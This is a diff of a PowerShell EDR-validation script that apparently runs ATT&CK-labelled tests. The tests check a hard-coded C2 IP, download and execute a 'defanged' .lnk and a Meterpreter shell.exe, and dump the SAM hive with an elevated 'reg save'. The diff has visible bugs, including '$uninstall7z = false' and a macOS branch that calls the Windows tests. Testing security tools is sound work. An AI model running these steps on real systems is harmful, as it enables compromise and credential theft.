@@ -53,13 +53,11 @@ function Get-OSType {
     }
 
     # Print the operating system with color and bold style
-    Write-Host -NoNewline "Operating System: " -ForegroundColor $color -BackgroundColor Black
-    Write-Host -NoNewline "$os" -ForegroundColor $color -BackgroundColor Black
-    Write-Host " (Selecting appropriate tests)`n"
-    Log-Message "Operating System: $os"
+    Write-Host -NoNewline "`nOperating System: "
+    Write-Host "$os" -ForegroundColor $color -BackgroundColor Black
+    Log-Message "Operating System: $os - Selecting appropriate tests"
+    return $os
 }
-
-
 
 function Test-C2-Port {
     $IPAddress = "172.174.245.183"
@@ -68,12 +66,11 @@ function Test-C2-Port {
         $tcpClient = New-Object System.Net.Sockets.TcpClient
         $tcpClient.Connect($IPAddress, $Port)
         $tcpClient.Close()
-        Log-Message "C2 IS CURRENTLY LISTENING and Operational" ""
+        Log-Message "C2 IS CURRENTLY LISTENING and Operational" "C2 Operational"
     } catch {
         Log-Message "C2 Server is NOT LISTENING (PORT NOT ACCESSIBLE)"
     }
 }
-
 
 function Test-SMTPAuthentication {
     do {
@@ -104,7 +101,6 @@ function Test-SMTPAuthentication {
         }
     } while ($true)  # Continue prompting until successful authentication
 }
-
 
 function Get-Script-Password {
     # Prompt the user for a password without showing the username prompt
@@ -149,11 +145,9 @@ function Log-Message {
     Add-Content -Path "logfile.txt" -Value $LogMessage
 }
 
-
-
 # Function to run commands 
-function Run-AtomicTest1-Windows {
-    Log-Message "Run-AtomicTest1-Windows: Starting"
+function AtomicTest1-Windows {
+    Log-Message "AtomicTest1-Windows: Starting"
     Write-Host "
     Test 1: T1204.002 : User Execution: Defanged malicious .lnk file
     ------------------------------------
@@ -182,31 +176,30 @@ function Run-AtomicTest1-Windows {
 
     $confirmation = Read-Host "Do you want to proceed with T1204.002 : User Execution: Defanged malicious .lnk file? (Y/N)"
     if ($confirmation -ne "Y") {
-            Log-Message "Run-AtomicTest1-Windows: Cancelled test"
-            Write-Host "Exiting script..."
+            Log-Message "AtomicTest1-Windows: Cancelled test, exiting script..."
             return
         }
     
     try {
         # Try downloading the file from the first URL
-        Log-Message "Run-AtomicTest1-Windows: Downloading LNK file"
+        Log-Message "AtomicTest1-Windows: Downloading LNK file"
         Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url -ErrorAction Stop
-        Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url"
+        Log-Message "AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url"
     }
     catch {
         # If an error occurs, display the error message
-        Log-Message "Run-AtomicTest1-Windows: Error downloading file from $($T1204002Url): $_" -Error $_.Exception.Message
-        Log-Message "Run-AtomicTest1-Windows:Trying second URL..."
+        Log-Message "AtomicTest1-Windows: Error downloading file from $($T1204002Url): $_" -Error $_.Exception.Message
+        Log-Message "AtomicTest1-Windows:Trying second URL..."
         
         try {
             # Try downloading the file from the second URL
             Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url2 -ErrorAction Stop
-            Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url2"
+            Log-Message "AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url2"
         }
         catch {
             # If an error occurs again, display the error message and exit
-            Log-Message "Run-AtomicTest1-Windows: Error downloading file from $($T1204002Url2): $_" -Error $_.Exception.Message
-            Log-Message "Run-AtomicTest1-Windows: Unsuccessful Download from both URLs"
+            Log-Message "AtomicTest1-Windows: Error downloading file from $($T1204002Url2): $_" -Error $_.Exception.Message
+            Log-Message "AtomicTest1-Windows: Unsuccessful Download from both URLs"
             return
         }
     }
@@ -216,10 +209,10 @@ function Run-AtomicTest1-Windows {
 
     # Execute the downloaded file
     try {
-        Log-Message "Run-AtomicTest1-Windows: Executing the downloaded file: $lnkFile"
+        Log-Message "AtomicTest1-Windows: Executing the downloaded file: $lnkFile"
         Start-Process $lnkFile
     } catch {
-        Log-Message "Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
+        Log-Message "AtomicTest1-Windows: Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
     }
     
 
@@ -228,21 +221,25 @@ function Run-AtomicTest1-Windows {
 
     # Kill the process named "a.exe"
     try {
-        Log-Message "Run-AtomicTest1-Windows: Killing the a.exe (putty) process"
+        Log-Message "AtomicTest1-Windows: Killing the a.exe (putty) process"
         taskkill /IM a.exe /F
     } catch {
-        Log-Message "Failed to execute the downloaded file: $lnkFile." -Error $_.Exception.Message
+        Log-Message "AtomicTest1-Windows: Failed to kill the process: a.exe" -Error $_.Exception.Message
     }
 
     # Removing all downloaded or created files
-    Log-Message "Run-AtomicTest1-Windows: Removing all downloaded or created files"
+    Log-Message "AtomicTest1-Windows: Removing all downloaded or created files"
     $file2 = Join-Path $tempDirectory "a.exe"
-    Remove-Item $lnkFile -ErrorAction Ignore
-    Remove-Item $file2 -ErrorAction Ignore
+    $filesToRemove = $lnkFile, $file2
+    foreach ($file in $filesToRemove) {
+        Remove-Item $file -ErrorAction Ignore
+        Log-Message "Run-AtomicTest1-Windows-1: Removed $file"
+    }
+
 }
 
-function Run-AtomicTest2-Windows {
-    Log-Message "Run-AtomicTest2-Windows: Starting"
+function AtomicTest2-Windows {
+    Log-Message "AtomicTest2-Windows: Starting"
 
     # Write the test description
     Write-Host "
@@ -270,7 +267,7 @@ function Run-AtomicTest2-Windows {
     Write-Host "non-operational" -ForegroundColor Green -NoNewline
     Write-Host " prior to execution: "
     Test-C2-Port
-    
+    $uninstall7z = false
     # First URL to download
     $T12040022Url = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/shell-trifident.zip"
     
@@ -280,94 +277,193 @@ function Run-AtomicTest2-Windows {
     $confirmation = Read-Host "`nDo you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
     Log-Message "User confirmation: $confirmation"
     if ($confirmation -ne "Y") {
-        Write-Host "Exiting script..."
+        Log-Message "AtomicTest2-Windows: Cancelled test, exiting script..."
         return
     }
 
     # Attempt to download the file from the first URL
     try {
-        Log-Message "Downloading shell-trifident.zip from first URL"
+        Log-Message "AtomicTest2-Windows: Downloading shell-trifident.zip from first URL"
         Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url -ErrorAction Stop
-        Log-Message "File downloaded successfully from $T12040022Url"
+        Log-Message "AtomicTest2-Windows: File downloaded successfully from $T12040022Url"
     }
     catch {
         # If the first attempt fails, try the second URL
-        Log-Message "Error downloading file from $T12040022Url" -Error $_.Exception.Message
-        Log-Message "Trying second URL"
+        Log-Message "AtomicTest2-Windows: Error downloading file from $T12040022Url" -Error $_.Exception.Message
+        Log-Message "AtomicTest2-Windows: Trying second URL"
         try {
-            Log-Message "Downloading shell-trifident.zip from second URL"
+            Log-Message "AtomicTest2-Windows: Downloading shell-trifident.zip from second URL"
             Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url2 -ErrorAction Stop
-            Log-Message "File downloaded successfully from $T12040022Url2"
+            Log-Message "AtomicTest2-Windows: File downloaded successfully from $T12040022Url2"
         }
         catch {
             # If both attempts fail, log the error and exit
-            Log-Message "Error downloading file from $T12040022Url2" -Error $_.Exception.Message
-            Log-Message "Failed to download the file from both URLs"
+            Log-Message "AtomicTest2-Windows: Error downloading file from $T12040022Url2" -Error $_.Exception.Message
+            Log-Message "AtomicTest2-Windows: Failed to download the file from both URLs"
             return
         }
     }
     $zipFile = Join-Path $tempDirectory "shell-trifident.zip"
     # Unzip the downloaded file
+    # Check if 7Zip4Powershell module needs to be installed
     if (-not (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
-        Log-Message "7Zip4Powershell module Not installed, installing" ""
+        Log-Message "AtomicTest2-Windows: 7Zip4Powershell module Not installed, installing" ""
+        $uninstall7z = $true  # Set uninstall flag
         Install-Module -Name 7Zip4Powershell -Force
-        Log-Message "7Zip4Powershell module installed"
+        Log-Message "AtomicTest2-Windows: 7Zip4Powershell module installed"
     } else {
-        Log-Message "7Zip4Powershell module is already installed."
+        Log-Message "AtomicTest2-Windows: 7Zip4Powershell module is already installed."
     }
+    
     try {
         if ((Get-Module -Name 7Zip4Powershell -ListAvailable)) {
-            Log-Message "Unzipping shell-trifident.zip"
+            Log-Message "AtomicTest2-Windows: Unzipping shell-trifident.zip"
             $ErrorActionPreference = "Stop"  # Set $ErrorActionPreference to "Stop"
             Expand-7Zip -ArchiveFileName $zipFile -Password "trifident" -TargetPath $tempDirectory
             $ErrorActionPreference = "Continue"  # Reset $ErrorActionPreference
-            Log-Message "shell-trifident.zip unpacked to $tempDirectory"
+            Log-Message "AtomicTest2-Windows: shell-trifident.zip unpacked to $tempDirectory"
         } else {
-            Log-Message "Unable to unzip the file because the 7Zip4Powershell module is not available."
+            Log-Message "AtomicTest2-Windows: Unable to unzip the file because the 7Zip4Powershell module is not available."
             return
         }
     } catch {
         #This errors if script is running on a non-Windows OS.  This should never happen.
-        Log-Message "Error unpacking shell-trifident.zip to $tempDirectory" -Error $_.Exception.Message
+        Log-Message "AtomicTest2-Windows: Error unpacking shell-trifident.zip to $tempDirectory" -Error $_.Exception.Message
     }
     
-
-    
     $executeFile = Join-Path $tempDirectory "shell.exe"
-    # Execute the downloaded file
-    Log-Message "Executing $executeFile"
-    Start-Process $executeFile
+
+    # Check if the file exists
+    if (Test-Path $executeFile) {
+        # Execute the downloaded file
+        try {
+            Log-Message "AtomicTest2-Windows: Executing the downloaded file: $executeFile"
+            Start-Process $executeFile -ErrorAction Stop
+        } catch {
+            Log-Message "AtomicTest2-Windows: Failed to execute the downloaded file: $executeFile. Error: $_" -Error $_.Exception.Message
+        }
+    } else {
+        Log-Message "AtomicTest2-Windows: The file $executeFile does not exist." "File not found"
+    }
 
     # Wait for 10 seconds
     Start-Sleep -Seconds 10
 
     # Terminate the process
-    taskkill /IM shell.exe /F
-    Log-Message "Terminated $executeFile process"
+    try {
+        Log-Message "AtomicTest2-Windows: Killing the shell.exe process"
+        taskkill /IM shell.exe /F
+    } catch {
+        Log-Message "AtomicTest2-Windows: Failed to terminate the process: shell.exe" -Error $_.Exception.Message
+    }
 
     # Clean up - remove downloaded files
-    Log-Message "Removing all downloaded or created files"
+    Log-Message "AtomicTest2-Windows: Removing all downloaded or created files"
     $filesToRemove = $zipFile, $executeFile
     foreach ($file in $filesToRemove) {
         Remove-Item $file -ErrorAction Ignore
-        Log-Message "Removed $file"
+        Log-Message "AtomicTest2-Windows: Removed $file"
     }
-
-    Log-Message "Run-AtomicTest2-Windows: Completed"
+    Log-Message "AtomicTest2-Windows: Checking to see if we need to uninstall 7Zip4Powershell: $uninstall7z"
+    if ($uninstall7z) {
+        Log-Message "AtomicTest2-Windows: Uninstalling 7Zip4Powershell"
+        Uninstall-Module -Name 7Zip4Powershell -Force
+        # Check if the module is installed
+        if (Get-Module -Name 7Zip4Powershell -ListAvailable) {
+            Log-Message "AtomicTest2-Windows: Module '7Zip4Powershell' is still installed. Please manually uninstall"
+        } else {
+            Log-Message "AtomicTest2-Windows: Module '7Zip4Powershell' has been successfully uninstalled."
+        }
+            return
+        }
+    Log-Message "AtomicTest2-Windows: Completed"
 }
 
+function AtomicTest3-Windows {
+    Log-Message "AtomicTest3-Windows: Starting"
+
+    # Write the test description
+    Write-Host "
+    Test 3: T1003.002 : OS Credential Dumping: Security Account Manager
+    ------------------------------------
+    
+    OS Credential Dumping using Living off the Land (LoL) binary 'reg.exe'
+    Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through 
+    in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that 
+    contains local accounts for the local host. Enumerating the SAM database requires SYSTEM level access.
+    
+    This test uses the LOLbin 'reg' (more info at https://lolbas-project.github.io/lolbas/Binaries/Reg/) to attempt to dump the 
+    SAM registry hive to a temp file location. This technique is known by attackers to retrieve password hashes and key material. 
+
+    This test will attempt to escalate to administrator privileges and attempt to run the command:
+    'reg save HKLM\sam %temp%\sam' (and if successful, will remove the %temp%\sam file)
+    
+    ------------------------------------
+    Expected Outcome: EDR detects, alerts, and prevents execution.
+    "
+
+    # Log the user confirmation
+    $confirmation = Read-Host "`nDo you want to proceed with Test 3: T1003.002 : OS Credential Dumping: Security Account Manager? (Y/N)"
+    Log-Message "User confirmation: $confirmation"
+    if ($confirmation -ne "Y") {
+        Log-Message "AtomicTest3-Windows: Cancelled test, exiting script..."
+        return
+    }
+
+    # Set the temporary file that will save any exported registry hives
+    $samFile = Join-Path $tempDirectory "sam"
+
+    # The command that needs to be run with elevated privileges
+    $Command = "reg save HKLM\sam $samfile"
+
+    # Start a new PowerShell process with elevated privileges
+    try {
+        Log-Message "AtomicTest3-Windows: Attempting to execute command as priviledged user"
+        Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $Command }`"" -Verb RunAs
+    } catch {
+        Log-Message "AtomicTest3-Windows: Error executing $Command" -Error $_.Exception.Message
+    }
+
+    # Check if the file exists
+    if (Test-Path $samFile) {
+        # Store results and securely delete the file
+        Log-Message "AtomicTest3-Windows: sam file exists"
+        Log-Message "AtomicTest3-Windows: Securely removing created files"
+        try {
+            $shell = New-Object -ComObject Shell.Application # Securely deletes file and bypasses Recycle Bin
+            $shell.Namespace(0).ParseName($samFile).InvokeVerb("delete") # Securely deletes file and bypasses Recycle Bin
+        } catch {
+            Log-Message "AtomicTest3-Windows: Unable to delete $samFile" "Unable to delete sam"
+        }
+    } else {
+        Log-Message "AtomicTest3-Windows: sam file does not exist"
+    }
+
+    Log-Message "AtomicTest3-Windows: Completed"
+}
 
 Log-Message "Starting script execution..."
 # Call the function to display the logo and begin tests
 Show-Logo
-Get-OSType
+$osType = Get-OSType
 # Prompt the user for execution password
 $ScriptPassword = Get-Script-Password
+
+# Validate user is authorized to exectute the script
 Test-SMTPAuthentication
-
-
 
 # Get the temporary directory path
 $tempDirectory = [System.IO.Path]::GetTempPath()
-Run-AtomicTest1-Windows
-Run-AtomicTest2-Windows
+
+# Only run tests valid for the current operating system
+if ($osType -eq "Windows") {
+    AtomicTest1-Windows
+    AtomicTest2-Windows
+    AtomicTest3-Windows
+} elseif ($osType -eq "macOS") {
+    AtomicTest1-Windows
+    AtomicTest2-Windows
+}
+
+
+
